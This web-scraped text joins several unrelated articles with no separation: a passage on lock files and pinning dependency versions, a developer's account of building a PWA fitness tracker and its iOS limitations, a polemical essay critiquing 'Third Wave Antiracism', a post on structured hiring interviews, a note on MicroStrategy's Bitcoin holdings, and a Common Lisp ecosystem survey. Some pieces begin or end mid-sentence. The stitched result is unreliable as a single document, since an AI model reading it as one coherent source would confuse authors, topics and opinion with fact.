the next “major” version, <code>5.0.0</code>.</p><p>That’s the theory. Of course, everyone does their best to keep the reality as close to it as possible. But&nbsp;<strong>sometimes new bugs are introduced in the new releases</strong>. Bugs do not care if that’s a version <code>4.16.0</code> or <code>5.0.0</code>. If you are lucky enough that the new bug affects your application, it can break after what should be a “safe” dependency update.</p><p>Of course, not all libraries follow the Semantic Versioning. With them, your expectation of non-breaking change when bumping up from <code>1.2.0</code> to <code>1.3.0</code> has no basis whatsoever.</p><p>So we probably would not like updates like this to happen on their own without our direct action, right?</p><h2><span id="but_i_have_a_dependency_lock_file"></span>But I have a dependency lock file!<span></span></h2><p>Some dependency managers create an additional file when installing libraries. A “lock” file. For example, the <a href="https://www.npmjs.com/">npm</a> creates the <code>package-lock.json</code>.</p><h3><span id="what_are_lock_files"></span>What are lock files?<span></span></h3><p>The lock file contains a list of all installed dependencies and their versions. This includes both the dependencies we specified, and their dependencies, and their dependencies, and their dependencies, … In other words, <strong>direct</strong> and <strong>transitive dependencies</strong>.</p><p>As a result, we have <strong>two files with dependencies list</strong>. First is the “regular” one, with a list of direct dependencies we specified. The second is the generated lock file. Both should be committed to the repository.</p><figure><table><thead><tr><th>File</th><th># of dependencies</th></tr></thead><tbody><tr><td><code>package.json</code></td><td>1 (<code>"webpack": "5.0.0"</code>)</td></tr><tr><td><code>package-lock.json</code></td><td>124</td></tr></tbody></table><figcaption>The number of transitive dependencies may be huge (not only in Node.js world)</figcaption></figure><p>Then, when installing dependencies on another machine, the <strong>dependency manager uses the lock file</strong> to determine what to install. Thanks to that, it gives us all libraries in exactly the same versions as used previously. Even if some libraries were updated in the meantime.</p><p>This is true even if in the “regular” dependencies file we specified version with a range (like the <code>^</code> symbol above). I must admit that until recently I was convinced that doing a simple npm install on a fresh environment would cause fetching the newest possible dependencies (matching the range), disregarding the lock file. It took me around 3 minutes of testing to make sure it does not.&nbsp;<strong>When the lock file is present, always the versions specified in it are installed.</strong>&nbsp;The only exception is when the version range in the regular file does not match the version in the lock file.</p><h3><span id="why_are_lock_files_great"></span>Why are lock files great?<span></span></h3><p>They keep track of the exact versions of all our dependencies. And by “all” I mean really all, so not only the ones we specify directly.</p><p>This way they provide us&nbsp;<strong>reproducible builds</strong>. Especially when everything works well at your workstation, you want it to build and deployed through the CI pipeline with exactly the same dependencies.</p><h3><span id="why_are_lock_files_not_enough"></span>Why are lock files not enough?<span></span></h3><p>Unfortunately, the lock files are not a solution for everything. They are&nbsp;<strong>long</strong>,&nbsp;<strong>not easily-readable</strong>, and&nbsp;<strong>auto-generated</strong>. That means the developers rarely focus on them, and just commit any generated changes.</p><p>There are a few reasons to still pin exact versions for direct dependencies we declare.</p><p><strong>Visibility.</strong>&nbsp;If I want to know the version of the library in the project, the first thing I do is opening the dependencies file. If the version there does not contain any <code>^~&amp;gt;</code> then my search is over. Otherwise, I need to find a proper command for the dependency manager I use to get the actual installed version of the library. Finding it manually in the lock file is neither a quick or effortless task.</p><p><strong>Upgrading.</strong> Every once in a while somebody will decide to upgrade all dependencies. Our dependency manager will then update all libraries to the latest possible versions, still taking into account the version range we declared for top-level dependencies. I will argue here, that upgrading transitive dependencies have a lower chance of breaking our application than upgrading the top-level (direct) ones. They are often smaller, more-widely used, and better tested. On the other hand, the <strong>top-level dependencies</strong> (and changes in them) <strong>tend to have the biggest impact</strong> on our code. For this reason, I prefer to upgrade direct dependencies knowingly, by manually changing the pinned version for each one of them in the “regular” dependencies file.</p><p>And, related, if things go south and the lock file is broken after a fatal merge or another cataclysm, you have a&nbsp;<strong>higher chance to recover</strong>&nbsp;by installing the top-level dependencies in the same versions you had before and only installing the latest matching versions of transitive dependencies.</p><h2><span id="two_rules_for_dependency_management"></span>Two rules for dependency management<span></span></h2><ol><li>Use dependency manager that generates a lock file and commit that lock file to the repository</li><li>Despite that, declare an exact dependency version (“pin it”) in the “regular” dependencies file</li></ol><h2 id="how-to-pin-by-default"><span id="how_to_pin_by_default"></span>How to pin by default<span></span></h2><p>Most dependency management tools, when using a command to add a new library, will save them with a version range.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-pwa.png" alt="PWA Logo"></p>
<p>I wanted to build a weightlifting tracker app that would be like Stronglifts 5x5, but flexible, so you could build any program in there or modify any program for your needs. And it'd still be a user-friendly, pleasant to use app. And it'd have all the features you expect from that kind of app - progress view, graphs, rest timer, plates calculator, etc.</p>
<p>I write web apps for a living. I'm not a mobile developer. I knew that you could write web apps for mobile phones (they're called PWA - Progressive Web Apps), and then you can install them without App Store or Google Play, and theoretically, they'll be exactly like native apps.</p>
<p>There's also something cool, from idealistic point of view, in writing web apps and running them on phones (vs native apps). Web a is free and decentralized platform, I don't need to rely on Apple Store or Google Play rules, web apps exist kinda in parallel with the Apple/Google gate-keeped stores, and don't have to play by its rules. Also, the update cycles are way faster - I can just push the new version out, and it will be immediately delivered to users' devices, I don't need to wait for a week until my new app version is reviewed by Apple or Google. It's not like the main reason why I wrote PWA, though - the main reason is that I'm just very comfortable with building web apps, I know how to do it. I'm way less comfortable with building native apps.</p>
<p>But I also heard that you would never reach the same user experience as with native apps, though I wasn't sure why. What exactly would prevent that? I was curious to know, I thought - I'm going to write this app as a PWA specifically targeted for mobile devices and experience the development process, see what road bumps I could hit, and how far I could go before I hit a wall.</p>
<p>And here I am, nine months later, with a working PWA app, which is already pretty feature-rich, and I think at this point I can reflect on the development process and share my thoughts about PWAs and what it takes to develop them.</p>
<h2>What the heck is PWA?</h2>
<p><a href="https://www.liftosaur.com/about">Liftosaur</a> is a PWA. What that really means is that it has a <a href="https://www.liftosaur.com/manifest.webmanifest">manifest file</a> and <a href="https://www.liftosaur.com/webpushr-sw.js">a script</a>, that runs as a Service Worker - special JavaScript code, that is run by a browser separately from a web page, in a background. We add a link to our manifest file in <code>index.html</code> like this:</p>
<pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>manifest<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>/manifest.webmanifest<span>"</span></span> <span>/&gt;</span></span></code></pre>
<p>and then we load that service worker script like this:</p>
<pre><code>navigator<span>.</span>serviceWorker<span>.</span><span>register</span><span>(</span><span>"/webpushr-sw.js"</span><span>)</span><span>;</span></code></pre>
<p>and voila! Our web page just became a Progressive Web App!</p>
<p>The manifest file describes how your app will look like mostly on phones - what icons would be used, whether it's full screen or with a URL bar, title/description, what splash screen looks like, etc.</p>
<p>The service worker script currently mostly solves two problems:</p>
<ul>
<li>Caches all the scripts, styles, and some API calls so that the app would work offline.</li>
<li>Sets up Web Push mechanism, so you'd get pushes when the timer is triggered, and it's time to start another exercise set.</li>
</ul>
<p>And that's mostly it! After that, you can add that web page to your phone home screen, and it'll like a native web app.</p>

    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-liftosaur.jpg" width="100%" alt="Liftosaur Screen on iOS"></p><p>This is what PWA app looks like on iOS</p>
  </div>
</div>
<p>But there are various problems associated with PWAs, related mainly to iOS Safari quirks and users' knowledge about PWAs.</p>
<h2>Pain points</h2>
<p>Mostly, my experience with building PWA - you can build decent PWA apps, though Mobile Safari definitely will try to make your life harder. I didn't really have any problems with Google Chrome on Android; the app works smoothly even on a cheap Android device. The major pain points were:</p>
<h3>Cookies are weird on iOS when you add your app to the home screen</h3>
<p>I initially set the app so that <code>index.html</code> and all other assets were loaded from <code>www.liftosaur.com</code> and served via Cloudflare CDN. API lived in Cloudflare workers on a separate domain, which used to be <code>liftosaur.workers.dev</code>. Some API expects the user to be logged in, so I had <code>liftosaur.workers.dev/api/signin/google</code>, which sets up a JWT auth cookie on the <code>liftosaur.workers.dev</code> domain. I don't need those cookies for the primary domain <code>www.liftosaur.com</code> (they're HttpOnly anyway, and I use them for API calls only). I thought it'd be fine - the cookies would live only on <code>liftosaur.workers.dev</code>, the browser would send them to all API endpoints (since they're also on <code>liftosaur.workers.dev</code>), and everything would just work. And it worked, almost everywhere - it worked in Mobile Safari browser, it worked in Chrome on Android. But if you add the app to the home screen on iOS, then for some reason, those cookies wouldn't be stored. Like, at all. I finally found a workaround - I stored the cookies with the <code>.liftosaur.com</code> domain and moved the API from <code>liftosaur.workers.dev</code> to <code>api.liftosaur.com</code>, so they'd share the same cookies with <code>www.liftosaur.com</code>. But it took me quite a while to figure that out.</p>
<h3>No web push notifications for iOS</h3>
<p>There's a feature in the app - after you've finished a set, you press a button, and it starts a timer. Once timer hits some threshold, it sends a push notification to your phone, so you know it's time to start another set. Apparently, there's no way to do that on iOS. I couldn't find a way to send a push notification in iOS, at all. It seems like a possible solution would be to install a "helper" native app that would proxy the push notification, but that seems excessive - I really doubt any user would want to do that!</p>
<h3>You can trigger a sound only on user action</h3>
<p>When the timer mentioned above hits a threshold, it plays a sound, so you know - it's time to start another set. I couldn't figure out how to do that on iOS. Safari on iOS only allows you to play a sound in e.g. an event click handler. If you try to play it on some random event happening (like for me, it was a Redux action triggering it), Safari complains about audio autoplay being forbidden. There're some solutions on the Internet/Stack Overflow, but none of them works. Apparently, if a user is done with the set and hits a button, you can start <code>setTimeout</code> and try to play the audio inside that <code>setTimeout</code>. It works, but only for small enough timeouts (like several seconds). Anything over a minute - and you get that audio autoplay forbidden error again.</p>
<p>I couldn't figure out that too for iOS. Liftosaur on iOS doesn't send push notifications when timers hit a threshold, and also it doesn't make a sound when it happens :(</p>
<h3>iOS could be pretty aggressive unloading from memory the opened PWA apps that are added to the home screen</h3>
<p>Imagine you just finished a set, and you switch to Twitter to read some stuff there while resting. A couple of minutes later, you switch back to Liftosaur - and iOS already unloaded it from memory, so Liftosaur loads again. So you need to make sure your app launches fast, and also you store as much internal state as possible in IndexedDB. Otherwise, users may have a horrible experience losing all their progress.</p>
<p>To be fair, it got better after iOS 13, and it's not as aggressive with unloading PWAs from memory anymore, but it still happens sometimes.</p>
<h3>Missing some default gestures</h3>
<p>There're some gestures built-in into any native app. Like swipe left to right across the screen gets you back to the previous page. Obviously you don't get them for PWAs, since it's just a web page.</p>
<p>It's not that big of a deal to implement those, but you have to implement those, and on a native app, you get them for free.</p>
<p>I personally don't use gestures much on my phone apps, but I can see how it could be a UX issue for some users.</p>
<h3>Choose your app icon wisely because it will stay forever</h3>
<p>If you add a PWA app to your home screen, whatever the app icon was, it will be there forever. Even if you update the manifest with the new icon, the icon won't change on the home screen. Not that big of a deal, but it definitely was an unpleasant surprise.</p>
<h3>Users have no idea what the heck PWA is</h3>
<p><strong>And here's our winner!!!</strong> The major pain point of PWA is the users' knowledge. They don't know that a web page they're on is a web app they can install to their home screen. They don't know how to do that (and frankly, iOS Safari doesn't even try to make it obvious). They often even never heard of PWAs at all. They don't know PWAs exist and they can add a web app to their home screen.</p>
<div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-share.png" width="100%" alt="Liftosaur Screen with share icon"></p><p>To add to home screen on iOS, you need to Share (!) first</p>
  </div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-add-to-home.png" width="100%" alt="Share screen with 'Add to Home Screen' option highlighted"></p><p>And there find the option "Add to Home Screen"</p>
  </div>
</div>
<p>So, you need to deliver the installation instructions to your users somehow. Since there's a good chance they've never installed a PWA previously in their life, there're high chances that this PWA will be their first one, and they are going to figure out how to do that.</p>
<p>It is already hard to convince somebody to install an app. Convince somebody to install a web app is ten times harder if they never did that, and they don't know it's possible.</p>
<p>To be fair, if you use a web app several times on Android Chrome, and it's a PWA, Chrome will suggest adding it to the home screen once it notices you use the app often. iOS Safari will not.</p>
<p>In my opinion, this is the worst pain point of PWA. Technology-wise, and especially on Android - you can make very decent phone apps, and get the user experience very close to native apps. But the people aspect - educating users about PWAs and how to install them - is way harder.</p>
<p>Here's a bright side, though - Google Play allows you to publish your PWAs right in the store. It's called <a href="https://developers.google.com/web/android/trusted-web-activity">TWA (Trusted Web Activity)</a>, and that makes the PWA installation process look exactly like a native app - you can find it in the Play Store, click Install, and it will get installed, just like a regular app. Obviously - nothing like that exists on iOS.</p>
<div>
  <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-google-play.png" width="100%" alt="Liftosaur in Google Play"></p><p>PWA in Google Play Store</p>
</div><p>To build TWA, you'll need to ensure you get maximum PWA points in Lighthouse, and then you can use <a href="https://www.pwabuilder.com/">PWABuilder</a>, that will generate Android APK, which you can upload to Google Play Store.</p>

First Wave Antiracism battled slavery and segregation. Second Wave Antiracism, in the 1970s and 1980s, battled racist attitudes and taught America that being racist was a flaw. Third Wave Antiracism, becoming mainstream in the 2010s, teaches that racism is baked into the structure of society, so whites’ “complicity” in living within it constitutes racism itself, while for black people, grappling with the racism surrounding them is the totality of experience and must condition exquisite sensitivity toward them, including a suspension of standards of achievement and conduct.</p><p>Third Wave Antiracist tenets, stated clearly and placed in simple oppositions, translate into nothing whatsoever:</p><ol><li><p>When black people say you have insulted them, apologize with profound sincerity and guilt. <strong>But </strong>don’t put black people in a position where you expect them to forgive you. They have dealt with too much to be expected to.</p></li><li><p>Black people are a conglomeration of disparate individuals. “Black culture” is code for “pathological, primitive ghetto people.” <strong>But </strong>don’t expect black people to assimilate to “white” social norms because black people have a culture of their own.</p></li><li><p>Silence about racism is violence. <strong>But </strong>elevate the voices of the oppressed over your own.</p></li><li><p>You must strive eternally to understand the experiences of black people. <strong>But </strong>you can never understand what it is to be black, and if you think you do you’re a racist.</p></li><li><p>Show interest in multiculturalism.&nbsp;<strong>But </strong>do not culturally appropriate. What is not your culture is not for you, and you may not try it or do it. But—if you aren’t nevertheless <em>interested</em> in it, you are a racist.</p></li><li><p>Support black people in creating their own spaces and stay out of them. <strong>But </strong>seek to have black friends. If you don’t have any, you’re a racist. And if you claim any, they’d better be <em>good</em> friends—in their private spaces, you aren’t allowed in.</p></li><li><p>When whites move away from&nbsp;black neighborhoods, it’s white flight.&nbsp;<strong>But </strong>when whites move into black neighborhoods, it’s gentrification, even when they pay black residents generously for their houses.</p></li><li><p>If you’re white and only date white people, you’re a racist. <strong>But </strong>if you’re white and date a black person you are, if only deep down, exotifying an “other.”</p></li><li><p>Black people cannot be held accountable for everything every black person does. <strong>But </strong>all whites must acknowledge their personal complicity in the perfidy throughout history of “whiteness.”</p></li><li><p>Black students must be admitted to schools via adjusted grade and test score standards to ensure a representative number of them and foster a diversity of views in classrooms. <strong>But </strong>it is racist to assume a black student was admitted to a school via racial preferences, and racist to expect them to represent the “diverse” view in classroom discussions.</p></li></ol><p>I suspect that deep down, most know that none of this catechism makes any sense. Less obvious is that it was not even composed with logic in mind. The self-contradiction of these tenets is crucial, in revealing that Third Wave Antiracism is not a philosophy but a religion. </p><p>The revelation of racism is, itself and alone, the point, the intention, of this curriculum. As such, the fact that if you think a little, the tenets cancel one another out, is considered trivial. That they serve their true purpose of revealing people as bigots is paramount—sacrosanct, as it were. Third Wave Antiracism’s needlepoint homily <em>par excellence</em> is the following:</p><blockquote><p>Battling power relations and their discriminatory effects must be the central focus of all human endeavor, be it intellectual, moral, civic or artistic. Those who resist this focus, or even evidence insufficient adherence to it, must be sharply condemned, deprived of influence, and ostracized.</p></blockquote><p><strong>Third Wave Antiracism is losing innocent people jobs.</strong> It is coloring, detouring and sometimes strangling academic inquiry. It forces us to render a great deal of our public discussion of urgent issues in doubletalk any 10-year-old can see through. It forces us to start teaching our actual 10-year-olds, in order to hold them off from spoiling the show in that way, to believe in sophistry in the name of enlightenment. On that, Third Wave Antiracism guru Ibram X. Kendi has written a book on how to raise antiracist children called <em>Antiracist Baby</em>. You couldn’t imagine it better: Are we in a Christopher Guest movie? This and so much else is a sign that Third Wave Antiracism forces us to pretend that performance art is politics. It forces us to spend endless amounts of time listening to nonsense presented as wisdom, and pretend to like it.</p><p>I write this viscerally driven by the fact that all of this supposed wisdom is founded in an ideology under which white people calling themselves our saviors make black people look like the dumbest, weakest, most self-indulgent human beings in the history of our species, and teach black people to revel in that status and cherish it as making us special. Talking of <em>Antiracist Baby</em>, I am especially dismayed at the idea of this indoctrination infecting my daughters’ sense of self. I can’t always be with them, and this anti-humanist ideology may seep into their school curriculum. I shudder at the thought: teachers with eyes shining at the prospect of showing their antiracism by teaching my daughters that they are poster children rather than individuals. </p><p>Ta-Nehisi Coates in <em>Between the World and Me</em> wanted to teach his son that America is set against him; I want to teach my kids the reality of their lives in the 21st&nbsp;rather than early-to-mid-20th century. Lord forbid my daughters internalize a pathetic—yes, absolutely pathetic in all of the resonances of that word—sense that what makes them interesting is what other people think of them, or don’t.</p><p>Many will see me as traitorous in writing this as a black person. They will not understand that I see myself as serving my race by writing it. One of the grimmest tragedies of how this perversion of sociopolitics makes us think (or, not think) is that it will bar more than a few black readers from understanding that I am calling for them to be treated with true dignity. However, they and everyone else should also realize: I know quite well that white readers will be more likely to hear out views like this when written by a black person, and consider it nothing less than my duty as a black person to write it.</p><p>A white version of this would be blithely dismissed as racist. I will be dismissed instead as self-hating by a certain crowd. But frankly, they won’t really mean it, and anyone who gets through <a href="https://johnmcwhorter.substack.com/p/the-elect-neoracists-posing-as-antiracists">my new book</a> on this subject, which I am now publishing in serial, will see that whatever traits I harbor, hating myself or being ashamed of being black is not one of them. And we shall move on. As in, to realizing that what I am documenting matters, and matters deeply. Namely, that America’s sense of what it is to be intellectual, moral, or artistic; what it is to educate a child; what it is to foster justice; what is to express oneself properly; what it is to be a nation—all is being refounded upon a religion. </p><p>This is directly antithetical to the very foundations of the American experiment. Religion has no place in the classroom, in the halls of ivy, in our codes of ethics, or in deciding how we express ourselves, and almost all of us spontaneously understand that and see any misunderstanding of the premise as backward. Yet since about 2015, a peculiar contingent has been slowly headlocking us into making an exception, supposing that this new religion is so incontestably good, so gorgeously surpassing millennia of brilliant philosophers’ attempts to identify the ultimate morality, that we can only bow down in humble acquiescence.</p><p>But a new religion in the guise of world progress is not an advance; it is a detour. It is not altruism; it is self-help. It is not sunlight; it is fungus. It’s time it became ordinary to call it for what it is and stop cowering before it, letting it make people so much less than they—black and everything else—could be.</p><p><strong>Third Wave Antiracism exploits modern Americans’ fear</strong> of being thought racist, using this to promulgate an obsessive, self-involved, totalitarian and unnecessary kind of cultural reprogramming. One could be excused for thinking this glowering kabuki is a continuation of the Civil Rights efforts of yore, the only kind of new antiracism there could be. Its adherents preach with such contemptuous indignation, and are now situated in the most prestigious and influential institutions in the land—on their good days they can seem awfully “correct.”</p><p>However, there is nothing correct about the essence of American thought and culture being transplanted into the soil of a religious faith. Some will go as far as to own up to it being a religion, and wonder why we can’t just accept it as our new national creed. The problem is that on matters of societal procedure and priorities, the adherents of this religion—true to the very nature of religion—cannot be reasoned with. They are, in this, medievals with lattes.</p><p>We need not wonder what the basic objections will be: Third Wave Antiracism isn’t really a religion; I am oversimplifying; I shouldn’t write this without being a theologian; it is a religion but it’s a good one; and so on. I will get all of that out of the way as we go on, and then offer some genuine solutions. But first, what this is not.</p><ol><li><p><em>It is not an argument against protest.</em> I am not arguing against the basic premises of Black Lives Matter, although I have had my differences with some of its offshoot developments. I am not arguing that the Civil Rights movement of the 1950s and 1960s would have been better off sticking to quiet negotiations. I am not arguing against the left. I am arguing against a particular strain of the left that has come to exert a grievous influence over American institutions, to the point that we are beginning to …</p></li></ol></div></div>

<p>I’ve talked about what seem to be two conflicting topics: <a href="https://hiringfor.tech/2020/06/29/fighting-bias-with-structured-interviews.html">standardizing your interviews</a> and <a href="http://localhost:4001/2020/12/07/getting-to-know-the-candidate-before-the-interview.html">accommodating different candidates</a>. So how can you be accommodating without introducing bias?</p>

<p>It turns out, you can give different candidates different questions, or even a different interview process, based on:</p>

<ul>
  <li>
    <p><strong>Comfort with in-person interviews.</strong> Interviewing is stressful, so if you want to find the best people, you’ll have to accommodate those who don’t perform well on the spot. For these candidates, <a href="https://hiringfor.tech/2020/08/10/how-fair-is-the-take-home-assignment.html">a take-home assignment is a good option</a>, as is <a href="https://hiringfor.tech/2020/08/03/reducing-interview-stress-with-independent-work.html">independent work</a>.</p>
  </li>
  <li>
    <p><strong>Prior experience.</strong> Really good engineers have a solid foundation, and can learn individual technologies quickly. So if you’re looking for a Vue engineer, but your candidate has more experience with React, you’re still going to get a better signal by seeing how they work with React. Same if you let the candidate use <a href="https://hiringfor.tech/2020/07/27/let-the-candidate-choose-their-programming-language.html">the language they’re most comfortable with</a>.</p>
  </li>
</ul>

<p>The important consideration is that all the options you provide and all the questions you ask are picked from a standardized pool your company has created ahead of time.</p>

<h2 id="maintaining-objectivity">Maintaining objectivity</h2>

<p>For the interview questions to be standardized, it’s important each one stand on its own. Tying this concept back to the examples above:</p>

<ul>
  <li>
    <p>An in-person interview question must have objective criteria for failure, success and excellence. Similarly, a take-home assignment must have objective criteria for failure, success and excellence. Don’t compare the two types of interviews, just how well the candidate did in their respective interview.</p>
  </li>
  <li>
    <p>Evaluate how prior experience translates to applicability to the role. For an experienced web developer role, you’ll want someone who understands web development. But even if your company uses Vue, a candidate with React experience and a great React solution to your interview problem is a better fit that someone with Vue experience who does poorly with a Vue solution. Make sure each version of the problem is evaluated on its own merit.</p>
  </li>
</ul>

<p>Both of these align with the principles of structured interviews. At the same time, being flexible with your requirements and providing different interview options means you can evaluate a wide range of candidates. <strong>Ultimately, <a href="https://hiringfor.tech/2020/10/19/looking-for-strengths-is-not-lowering-the-bar.html">you don’t have to lower the bar</a>. It’s just that the same height bar looks different for different people.</strong></p>

<hr>

<p>There isn’t a one-size-fits-all solution to hiring. But it is possible to create a process that maintains objectivity while accommodating different types of candidates. The key is to define evaluation criteria for each interview option you offer.</p>

            <p>A number of companies have recently started assembling Bitcoin treasuries. There are two <a href="https://bitcointreasuries.org/">good</a> <a href="https://bitcointreasuryreserve.com/">websites</a> for tracking these purchases. MicroStrategy currently has the largest known Bitcoin reserve (71,079 BTC) with 36% of the market cap attributed to the market value of their Bitcoin reserve.</p><p>They recently started to dabble in Bitcoin advocacy, hosting several <a href="https://www.microstrategy.com/en/search-results?q=bitcoin">sessions</a> and introducing ~6900 companies to their process for acquiring Bitcoin. If they succeed, expect the list to get a lot longer.</p><figure><img src="https://www.peteriserins.com/content/images/2021/02/image-2.png" alt="" srcset="https://www.peteriserins.com/content/images/size/w600/2021/02/image-2.png 600w, https://www.peteriserins.com/content/images/size/w1000/2021/02/image-2.png 1000w, https://www.peteriserins.com/content/images/2021/02/image-2.png 1048w" sizes="(min-width: 720px) 720px"><figcaption>bitcointreasuries.org</figcaption></figure><p>But why would someone pay $10 to own $3.6 in BTC?</p><p>For one, it's hard to access Bitcoin in tax efficient vehicles such as the UK's ISA accounts. Certain companies are also limited from taking on too much Bitcoin custody risk. And yes, some market participants could simply be speculating that MicroStrategy will be priced even higher due to its unique treasury strategy.</p><p>The idea is simple, $6.4 of each $10 purchase goes towards MicroStrategy's business. The business hopefully stays relatively stable and the rest of the purchase will be allocated to the BTC treasury.</p><p>But while MicroStrategy's business is in a stable <a href="https://seekingalpha.com/article/4395392-microstrategy-enterprise-software-to-bitcoin-speculation">decline</a>, the implied premium on their core business is much higher than I expected. In the chart above, the orange line indicates the implied price per each share that goes to the core business. From just over $100 earlier the year, it has now jumped to over $500, a 5x premium on the value of a falling business with no other ideas for investing excess cashflow. It may have been a good idea to invest in 2020. Not so much today.</p><p>So while it's an expensive way to buy BTC, Michael Saylor's <a href="https://www.sec.gov/Archives/edgar/data/0001050446/000119312521020760/d92691dex991.htm">comments</a> in their quarterly filings suggest another reason to buy.</p><blockquote>Going forward, we continue to plan to hold our bitcoin and invest additional excess cash flows in bitcoin. Additionally, we will explore various approaches to acquire additional bitcoin as part of our overall corporate strategy.</blockquote><p>The entire point of owning MicroStrategy is to outsource not just BTC ownership but BTC purchasing to Michael Saylor. It's the intent to buy even more BTC that has made MicroStrategy the leading Bitcoin treasury owner.</p><p>The premium may just pay for the promise that Michael Saylor together with Coinbase can identify better timing on when to make those purchases. Indeed, as an individual investor, it is trivial to purchase BTC at current prices, but substantial acquisitions by larger companies move the market and have to be carefully timed. For those companies, MicroStrategy can serve as a temporary holding point before they are able to build up their own position.</p><p><strong>Disclaimer</strong></p><p><em>This is not investment advice.</em></p>

<p>This is a description of the Common Lisp ecosystem, as of January, 2021,
from the perspective of a user and contributor.</p>

<p>The purpose of this article is both to give an overview of the
ecosystem, and to help drive consolidation in each domain.</p>

<p>Each application domain has recommendations for consolidating that
part of the ecosystem, and pointers for interesting future work.</p>

<p>This article is derived from
Fernando Borretti’s <a href="https://borretti.me/article/common-lisp-sotu-2015">State of the Common Lisp ecosystem from 2015</a>, hence the introduction that sounded familiar.
This new one will be an opportunity to look at what was achieved, or what is
still lacking.</p>

<p><strong>Disclaimer</strong>: This article is not a list of every project or article of interest that came out in the last years. I wrote an overview of 2018 closer to that goal <a href="https://lisp-journey.gitlab.io/blog/these-years-in-common-lisp-2018/">here</a>.

<h2 id="command-line">Command line</h2>

<p>There used to be several options to ease building and distribution of command line programs,
but now <a href="https://github.com/snmsts/roswell">Roswell</a> has gained most momentum,
and that’s a good thing. Roswell is an implementation
manager, installer and a script runner, and one of its neat features is support for
very easily compiling tiny scripts into executables.</p>

<p>Now, <a href="https://guix.gnu.org/">GNU Guix</a> has gained many CL libraries, and becomes a contender to Roswell. Guix can be used as a package manager on top of your Unix distribution. It brings reproducible builds, rollbacks, the ability to install exact versions of any library (including system dependencies), contained environments and user profiles. It makes it easy too to install the latest version of a CL implementation and libraries and, to a certain extent, to share scripts. See the article <a href="https://ambrevar.xyz/lisp-repl-shell/index.html">A Lisp REPL as my main shell</a> for insights.</p>

<p>To parse command line arguments, <a href="https://github.com/mrkkrp/unix-opts">unix-opts</a> shows decent activity. As a reminder, the CLI arguments are stored portably in <code>uiop:command-line-arguments</code>.</p>

<p><a href="https://github.com/cl-adams/adams">Adams</a> is a new UNIX system administration tool, not unlike Chef or Ansible.</p>

<p><strong>Consolidation</strong></p>

<p>More features to the <a href="https://github.com/CodyReichert/awesome-cl#scripting">sripting libraries</a>.</p>

<p><strong>Future work</strong></p>

<p>The <a href="https://github.com/cxxxr/lem/">Lem editor</a> has built a great user interface and REPL on top of ncurses, with the cl-charms library. It would be great to re-use its components, so that Lispers could easily build similar rich terminal-based interfaces.</p>

<h2 id="databases">Databases</h2>

<p><a href="https://github.com/fukamachi/mito">Mito</a> is an ORM for Common Lisp
with migrations, relationships and PostgreSQL support. It is based on
cl-dbi (a uniform interface to the various database server-specific
libraries such as cl-postgres and cl-mysql) and SxQL (a DSL for
building safe, automatically parameterized SQL queries).</p>

<p>It also has a tutorial in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/databases.html">Cookbook/databases</a>.</p>

<!-- On my blog, [an article](https://lisp-journey.gitlab.io/blog/composing-queries-with-mito-aka-replacing-lazy-querysets-and-q-objects/) -->

<!-- on how to compose queries with Mito and SxQL, and on how we only need -->

<!-- lisp knowledge to replace Django functionalities. -->

<p>There are of course more libraries in that field. Some new ones since 2015 are:</p>

<p><a href="https://github.com/ruricolist/cl-yesql">cl-yesql</a> (by the author of
Serapeum, Spinneret and other great libraries) is based on Clojure’s
Yesql.</p>

<p><a href="https://github.com/kraison/vivace-graph-v3">vivace-graph</a> is a <strong>graph
database</strong> and Prolog implementation, taking design and inspiration from
CouchDB, neo4j and AllegroGraph.</p>

<p>Vsevolod Dyomkin, the author of Rutils, the Programming Algorithms
book and other libraries, is writing
<a href="https://github.com/vseloved/cl-agraph">cl-agraph</a>, a minimal client
to Franz Inc’s <a href="https://allegrograph.com/">AllegroGraph</a>. AllegroGraph is a
“horizontally distributed, multi-model (document and graph),
entity-event <strong>knowledge graph</strong> technology”. It is proprietary and has a
free version with a limit of 5 million triples. Surely one of those Lisp hidden gems we should know more about.</p>

<p>A general migration tool was lacking. We now have
<a href="https://github.com/dnaeon/cl-migratum">cl-migratum</a>, a “system which
provides facilities for performing database schema migrations,
designed to work with various databases”.</p>

<p>And of course, <a href="https://github.com/dimitri/pgloader">pgloader</a> is still a Common Lisp success story.</p>

<p><strong>Achievement</strong></p>

<p>Among the emerging ORMs, Mito is the one actively maintained that Lispers seem to have chosen. Good. CLSQL certainly still works, but we don’t hear about it and it looks outdated. So, Mito it is.</p>

<p><strong>Consolidation</strong></p>

<p>Mito has 11 contributors and is actively watched, but it probably should have another(s) core maintainers.</p>

<p><strong>Future work</strong></p>

<p>Bindings for the new databases coming out.</p>

<h2 id="concurrency">Concurrency</h2>

<p>In the last year, Manfred Bergmann developed
<a href="https://github.com/mdbergmann/cl-gserver">cl-gserver</a>. It is a
“message passing” library/framework with <strong>actors</strong> similar to
<strong>Erlang</strong> or <strong>Akka</strong>. It is an important achievement.</p>

<p>Its v1 features:</p>

<ul>
<li>actors can use a shared pool of message dispatchers which effectively allows to create millions of actors.</li>
<li>the possibility to create actor hierarchies. An actor can have child actors. An actor now can also “watch” another actor to get notified about its termination.</li>
</ul>

<p>Many other libraries exist in this area:</p>

<ul>
<li><a href="https://common-lisp.net/project/bordeaux-threads/">BordeauxThreads</a> - Portable, shared-state concurrency

<ul>
<li>the “de-facto” concurrency library.</li>
</ul></li>
<li><a href="https://github.com/lmj/lparallel">lparallel</a> - A library for parallel programming.

<ul>
<li>also solid, battle-tested and popular, aka de-facto.</li>
</ul></li>
<li><a href="https://github.com/hawkir/calispel">calispel</a> - <a href="https://en.wikipedia.org/wiki/Communicating_sequential_processes">CSP</a>-like channels for common lisp. With blocking, optionally buffered channels and a “CSP select” statement. ISC-style.

<ul>
<li>“It is complete, flexible and easy to use. I would recommend Calispel over Lparallel and ChanL.” @Ambrevar. <a href="https://github.com/CodyReichert/awesome-cl/issues/290">discussion</a></li>
</ul></li>
